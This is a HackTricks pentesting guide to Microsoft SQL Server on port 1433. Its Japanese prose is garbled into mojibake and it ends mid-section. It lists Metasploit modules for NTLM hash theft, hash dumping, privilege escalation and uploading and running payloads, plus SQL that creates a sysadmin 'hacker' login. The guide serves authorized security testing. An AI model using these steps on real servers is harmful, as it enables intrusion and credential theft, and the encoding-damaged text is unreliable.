# 1433 - Pentesting MSSQL - Microsoft SQL Server

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofã¯ã™ã¹ã¦ã®æš—å·ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®å ´æ‰€ã§ã™ã€‚**

**é…å»¶ãªã—ã§å ±é…¬ã‚’å—ã‘å–ã‚‹**\
HackenProofã®ãƒã‚¦ãƒ³ãƒ†ã‚£ã¯ã€é¡§å®¢ãŒå ±é…¬äºˆç®—ã‚’å…¥é‡‘ã—ãŸå¾Œã«é–‹å§‹ã•ã‚Œã¾ã™ã€‚ãƒã‚°ãŒæ¤œè¨¼ã•ã‚ŒãŸå¾Œã«å ±é…¬ã‚’å—ã‘å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**Web3ãƒšãƒ³ãƒ†ã‚¹ãƒˆã®çµŒé¨“ã‚’ç©ã‚€**\
ãƒ–ãƒ­ãƒƒã‚¯ãƒã‚§ãƒ¼ãƒ³ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¨ã‚¹ãƒãƒ¼ãƒˆã‚³ãƒ³ãƒˆãƒ©ã‚¯ãƒˆã¯æ–°ã—ã„ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§ã™ï¼ä¸Šæ˜‡æœŸã®web3ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ãƒã‚¹ã‚¿ãƒ¼ã—ã¾ã—ã‚‡ã†ã€‚

**Web3ãƒãƒƒã‚«ãƒ¼ãƒ¬ã‚¸ã‚§ãƒ³ãƒ‰ã«ãªã‚‹**\
å„æ¤œè¨¼æ¸ˆã¿ã®ãƒã‚°ã§è©•åˆ¤ãƒã‚¤ãƒ³ãƒˆã‚’ç²å¾—ã—ã€é€±é–“ãƒªãƒ¼ãƒ€ãƒ¼ãƒœãƒ¼ãƒ‰ã®ãƒˆãƒƒãƒ—ã‚’åˆ¶è¦‡ã—ã¾ã—ã‚‡ã†ã€‚

[**HackenProofã§ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—**](https://hackenproof.com/register)ã—ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ã‹ã‚‰å ±é…¬ã‚’å¾—ã¾ã—ã‚‡ã†ï¼

{% embed url="https://hackenproof.com/register" %}

## åŸºæœ¬æƒ…å ±

**Microsoft SQL Server**ã¯ã€Microsoftã«ã‚ˆã£ã¦é–‹ç™ºã•ã‚ŒãŸ**é–¢ä¿‚ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**ç®¡ç†ã‚·ã‚¹ãƒ†ãƒ ã§ã™ã€‚ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚µãƒ¼ãƒãƒ¼ã¨ã—ã¦ã€ä»–ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‹ã‚‰ã®ãƒ‡ãƒ¼ã‚¿ã®æ ¼ç´ã¨å–å¾—ã‚’ä¸»ãªæ©Ÿèƒ½ã¨ã™ã‚‹ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢è£½å“ã§ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€åŒã˜ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ä¸Šã¾ãŸã¯ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ï¼ˆã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã‚’å«ã‚€ï¼‰ä¸Šã®åˆ¥ã®ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã§å®Ÿè¡Œã•ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚\
[wikipedia](https://en.wikipedia.org/wiki/Microsoft\_SQL\_Server)ã‹ã‚‰ã€‚

**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆï¼š** 1433
```
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
```
### **ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®MS-SQLã‚·ã‚¹ãƒ†ãƒ ãƒ†ãƒ¼ãƒ–ãƒ«**

* **masterãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**: SQL Serverã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ã‚·ã‚¹ãƒ†ãƒ ãƒ¬ãƒ™ãƒ«ã®æƒ…å ±ã‚’è¨˜éŒ²ã—ã¾ã™ã€‚
* **msdbãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**: SQL Server AgentãŒã‚¢ãƒ©ãƒ¼ãƒˆã¨ã‚¸ãƒ§ãƒ–ã®ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã«ä½¿ç”¨ã—ã¾ã™ã€‚
* **modelãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**: SQL Serverã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã§ä½œæˆã•ã‚Œã‚‹ã™ã¹ã¦ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ãƒ¢ãƒ‡ãƒ«ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«å¯¾ã—ã¦è¡Œã‚ã‚ŒãŸå¤‰æ›´ï¼ˆãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ã‚µã‚¤ã‚ºã€ç…§åˆé †åºã€å›å¾©ãƒ¢ãƒ‡ãƒ«ã€ãã®ä»–ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãªã©ï¼‰ã¯ã€ãã®å¾Œä½œæˆã•ã‚Œã‚‹ã™ã¹ã¦ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«é©ç”¨ã•ã‚Œã¾ã™ã€‚
* **Resourceãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**: SQL Serverã«å«ã¾ã‚Œã‚‹ã‚·ã‚¹ãƒ†ãƒ ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒæ ¼ç´ã•ã‚Œã¦ã„ã‚‹èª­ã¿å–ã‚Šå°‚ç”¨ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã§ã™ã€‚ã‚·ã‚¹ãƒ†ãƒ ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯Resourceãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ç‰©ç†çš„ã«æ°¸ç¶šåŒ–ã•ã‚Œã¾ã™ãŒã€è«–ç†çš„ã«ã¯ã™ã¹ã¦ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®sysã‚¹ã‚­ãƒ¼ãƒã«è¡¨ç¤ºã•ã‚Œã¾ã™ã€‚
* **tempdbãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**: ä¸€æ™‚ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚„ä¸­é–“çµæœã‚»ãƒƒãƒˆã‚’ä¿æŒã™ã‚‹ãŸã‚ã®ä½œæ¥­é ˜åŸŸã§ã™ã€‚

## åˆ—æŒ™

### è‡ªå‹•åˆ—æŒ™

ã‚µãƒ¼ãƒ“ã‚¹ã«ã¤ã„ã¦ä½•ã‚‚çŸ¥ã‚‰ãªã„å ´åˆ:
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping
```
{% hint style="info" %}
**è³‡æ ¼æƒ…å ±ã‚’æŒã£ã¦ã„ãªã„**å ´åˆã¯ã€ãã‚Œã‚‰ã‚’æ¨æ¸¬ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚nmapã¾ãŸã¯metasploitã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ—¢å­˜ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ä½¿ç”¨ã—ã¦ä½•åº¦ã‚‚ãƒ­ã‚°ã‚¤ãƒ³ã«å¤±æ•—ã™ã‚‹ã¨ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒ**ãƒ–ãƒ­ãƒƒã‚¯**ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

#### Metasploitï¼ˆè³‡æ ¼æƒ…å ±ãŒå¿…è¦ï¼‰
```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
### [**ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**](../../generic-methodologies-and-resources/brute-force.md#sql-server)

### æ‰‹å‹•åˆ—æŒ™

#### ãƒ­ã‚°ã‚¤ãƒ³
```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Using sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go
```
#### ä¸€èˆ¬çš„ãªåˆ—æŒ™

##### MSSQL Serverã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®ç‰¹å®š

MSSQL Serverã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®æ‰‹æ³•ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

1. ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ãƒ„ãƒ¼ãƒ«ï¼ˆä¾‹ï¼šNmapï¼‰ã‚’ä½¿ç”¨ã—ã¦ã€MSSQL ServerãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒãƒ¼ãƒˆã‚’ç‰¹å®šã—ã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€MSSQL Serverã¯TCPãƒãƒ¼ãƒˆ1433ã‚’ä½¿ç”¨ã—ã¾ã™ãŒã€ãƒãƒ¼ãƒˆç•ªå·ã¯å¤‰æ›´ã•ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

2. ãƒãƒ¼ãƒˆãŒç‰¹å®šã•ã‚ŒãŸã‚‰ã€MSSQL Serverã«æ¥ç¶šã—ã¦ãƒãƒ¼ã‚¸ãƒ§ãƒ³æƒ…å ±ã‚’å–å¾—ã—ã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```
$ nmap -p <port_number> --script ms-sql-info <target_ip>
```

3. ã‚‚ã—ãã¯ã€MSSQL Serverã«æ¥ç¶šã—ã¦ãƒãƒ¼ã‚¸ãƒ§ãƒ³æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```
$ echo "SELECT @@VERSION" | sqlcmd -S <target_ip> -U <username> -P <password>
```

##### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®åˆ—æŒ™

MSSQL Serverã«æ¥ç¶šã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’åˆ—æŒ™ã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®æ‰‹æ³•ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

1. ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®çµ„ã¿åˆã‚ã›ã‚’ç·å½“ãŸã‚Šæ”»æ’ƒã™ã‚‹ãŸã‚ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã®è¾æ›¸æ”»æ’ƒã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ä¸€èˆ¬çš„ãªãƒ¦ãƒ¼ã‚¶ãƒ¼åï¼ˆä¾‹ï¼šadminã€rootï¼‰ã‚„ä¸€èˆ¬çš„ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ï¼ˆä¾‹ï¼špasswordã€123456ï¼‰ã‚’ä½¿ç”¨ã—ã¦æ”»æ’ƒã—ã¾ã™ã€‚

2. ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ã€MSSQL Serverã®ã‚·ã‚¹ãƒ†ãƒ ãƒ†ãƒ¼ãƒ–ãƒ«ï¼ˆä¾‹ï¼šsys.sysloginsï¼‰ã‚’ã‚¯ã‚¨ãƒªã—ã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```
$ echo "SELECT name FROM sys.syslogins" | sqlcmd -S <target_ip> -U <username> -P <password>
```

##### ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®åˆ—æŒ™

MSSQL Serverã«æ¥ç¶šã—ã¦ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’åˆ—æŒ™ã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®æ‰‹æ³•ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

1. ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹åã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ã€MSSQL Serverã®ã‚·ã‚¹ãƒ†ãƒ ãƒ†ãƒ¼ãƒ–ãƒ«ï¼ˆä¾‹ï¼šsys.sysdatabasesï¼‰ã‚’ã‚¯ã‚¨ãƒªã—ã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```
$ echo "SELECT name FROM sys.sysdatabases" | sqlcmd -S <target_ip> -U <username> -P <password>
```

2. ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```
$ echo "SELECT @@VERSION" | sqlcmd -S <target_ip> -U <username> -P <password> -d <database_name>
```

##### ãƒ†ãƒ¼ãƒ–ãƒ«ã®åˆ—æŒ™

MSSQL Serverã«æ¥ç¶šã—ã¦ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’åˆ—æŒ™ã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®æ‰‹æ³•ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

1. ãƒ†ãƒ¼ãƒ–ãƒ«åã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ã€MSSQL Serverã®ã‚·ã‚¹ãƒ†ãƒ ãƒ†ãƒ¼ãƒ–ãƒ«ï¼ˆä¾‹ï¼šsys.sysobjectsï¼‰ã‚’ã‚¯ã‚¨ãƒªã—ã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```
$ echo "SELECT name FROM sys.sysobjects WHERE xtype = 'U'" | sqlcmd -S <target_ip> -U <username> -P <password> -d <database_name>
```

2. ãƒ†ãƒ¼ãƒ–ãƒ«ã®ã‚«ãƒ©ãƒ æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```
$ echo "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table_name>'" | sqlcmd -S <target_ip> -U <username> -P <password> -d <database_name>
```

##### ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã®åˆ—æŒ™

MSSQL Serverã«æ¥ç¶šã—ã¦ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã‚’åˆ—æŒ™ã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®æ‰‹æ³•ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

1. ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£åã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ã€MSSQL Serverã®ã‚·ã‚¹ãƒ†ãƒ ãƒ†ãƒ¼ãƒ–ãƒ«ï¼ˆä¾‹ï¼šsys.sysobjectsï¼‰ã‚’ã‚¯ã‚¨ãƒªã—ã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```
$ echo "SELECT name FROM sys.sysobjects WHERE xtype = 'P'" | sqlcmd -S <target_ip> -U <username> -P <password> -d <database_name>
```

2. ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã®å®šç¾©ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```
$ echo "EXEC sp_helptext '<stored_procedure_name>'" | sqlcmd -S <target_ip> -U <username> -P <password> -d <database_name>
```

##### ãƒ¦ãƒ¼ã‚¶ãƒ¼æ¨©é™ã®åˆ—æŒ™

MSSQL Serverã«æ¥ç¶šã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ¨©é™ã‚’åˆ—æŒ™ã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®æ‰‹æ³•ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

1. ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ¨©é™ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ã€MSSQL Serverã®ã‚·ã‚¹ãƒ†ãƒ ãƒ†ãƒ¼ãƒ–ãƒ«ï¼ˆä¾‹ï¼šsys.sysprotectsï¼‰ã‚’ã‚¯ã‚¨ãƒªã—ã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```
$ echo "SELECT * FROM sys.sysprotects" | sqlcmd -S <target_ip> -U <username> -P <password> -d <database_name>
```

2. ç‰¹å®šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ¨©é™ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```
$ echo "EXEC sp_helprotect '<username>'" | sqlcmd -S <target_ip> -U <username> -P <password> -d <database_name>
```
```sql
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```
#### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å–å¾—

{% content-ref url="types-of-mssql-users.md" %}
[types-of-mssql-users.md](types-of-mssql-users.md)
{% endcontent-ref %}
```sql
# Get all the users and roles
select * from sys.database_principals;
## This query filters a bit the results
select name,
create_date,
modify_date,
type_desc as type,
authentication_type_desc as authentication_type,
sid
from sys.database_principals
where type not in ('A', 'R')
order by name;

## Both of these select all the users of the current database (not the server).
## Interesting when you cannot acces the table sys.database_principals
EXEC sp_helpuser
SELECT * FROM sysusers
```
#### æ¨©é™ã®å–å¾—

MSSQLã®ç”¨èªã«ã¤ã„ã¦ã®ç´¹ä»‹:

1. **ã‚»ã‚­ãƒ¥ã‚¢ãƒ–ãƒ«ï¼ˆSecurableï¼‰:** SQL Server Database Engineã®èªå¯ã‚·ã‚¹ãƒ†ãƒ ãŒã‚¢ã‚¯ã‚»ã‚¹ã‚’åˆ¶å¾¡ã™ã‚‹ãƒªã‚½ãƒ¼ã‚¹ã§ã™ã€‚ã‚»ã‚­ãƒ¥ã‚¢ãƒ–ãƒ«ã¯ä»¥ä¸‹ã®3ã¤ã®åºƒã„ã‚«ãƒ†ã‚´ãƒªã«åˆ†é¡ã•ã‚Œã¾ã™:
* ã‚µãƒ¼ãƒãƒ¼ - ä¾‹: ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã€ãƒ­ã‚°ã‚¤ãƒ³ã€ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã€å¯ç”¨æ€§ã‚°ãƒ«ãƒ¼ãƒ—ã€ã‚µãƒ¼ãƒãƒ¼ãƒ­ãƒ¼ãƒ«
* ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ - ä¾‹: ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ­ãƒ¼ãƒ«ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ­ãƒ¼ãƒ«ã€ã‚¹ã‚­ãƒ¼ãƒã€è¨¼æ˜æ›¸ã€ãƒ•ãƒ«ãƒ†ã‚­ã‚¹ãƒˆã‚«ã‚¿ãƒ­ã‚°ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼
* ã‚¹ã‚­ãƒ¼ãƒ - ä¾‹: ãƒ†ãƒ¼ãƒ–ãƒ«ã€ãƒ“ãƒ¥ãƒ¼ã€ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã€é–¢æ•°ã€ã‚·ãƒãƒ‹ãƒ 
2. **æ¨©é™ï¼ˆPermissionï¼‰:** å„SQL Serverã‚»ã‚­ãƒ¥ã‚¢ãƒ–ãƒ«ã«ã¯ã€ALTERã€CONTROLã€CREATEãªã©ã®é–¢é€£ã™ã‚‹æ¨©é™ãŒã‚ã‚Šã¾ã™ã€‚æ¨©é™ã¯ã€ãƒ­ã‚°ã‚¤ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ™ãƒ«ã§ç®¡ç†ã•ã‚Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ¬ãƒ™ãƒ«ã§ç®¡ç†ã•ã‚Œã¾ã™ã€‚
